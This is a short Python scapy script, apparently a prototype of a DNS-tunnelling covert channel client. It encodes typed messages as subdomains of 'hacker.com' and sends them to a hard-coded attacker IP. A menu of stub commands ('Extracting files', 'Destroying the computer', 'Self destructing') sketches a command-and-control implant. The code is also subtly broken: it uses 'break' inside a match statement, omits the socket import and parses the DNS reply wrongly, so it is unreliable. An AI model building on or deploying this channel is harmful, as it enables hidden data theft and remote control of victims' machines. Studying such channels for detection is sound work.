from scapy.all import *
import base64
import struct

SRC_PORT = 40000
DST_PORT = 12345
IP_ATTACKER = "192.168.1.101"
DOMAIN_NAME = "hacker.com"

def run_client():

    message = input("enter message")
    dns_query = build_dns_query(f"{message}.{DOMAIN_NAME}")
    udp_header = create_udp_header(SRC_PORT, DST_PORT, len(dns_query))
    payload = udp_header + dns_query

    # Note: When manually constructing the UDP header, set the IP protocol to 17 (UDP).
    packet = IP(dst=IP_ATTACKER, proto=17) / Raw(load=payload)

    print("Sending packet ...")
    response = sr1(packet, timeout=10, filter=f"udp and dst port {DST_PORT}")

    if response:
        print("Received response:")
        response.show()
        ip = parse_dns_response(response)
        print(ip)

    else:
        print("No response received.")


def switch_case(choice2):
    match choice2:
        case "1":
            print("Extracting files...")
            break
        case "2":
            print("Destroying the computer...")
            break
        case "3":
            print("Self destructing...")
            break
        case "4":
            pass  # Do nothing
        case _:
            print("Invalid choice. Please enter a number between 1 and 4.")


def create_udp_header(src_port, dest_port, data_length):
    length = 8 + data_length
    checksum = 0
    return struct.pack('!HHHH', src_port, dest_port, length, checksum)

def build_dns_query(domain):
    # DNS Header
    transaction_id = 12345  # A random transaction ID (check the id is available)
    flags = 0x0100  # Standard query (Recursion Desired)
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    # Query Section for "A" record
    qname = encode_domain_name(domain)
    qtype = 1  # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    # Packing the DNS query
    query = struct.pack("!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    query += qname
    query += struct.pack("!HH", qtype, qclass)

    return query

def encode_domain_name(domain):
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to end the domain name
    return encoded_name

def parse_dns_response(response):
    # Extract the IP address from the answer section (last 4 bytes)
    ip_address = socket.inet_ntoa(response[-4:])
    return ip_address

if __name__ == "__main__":
    run_client()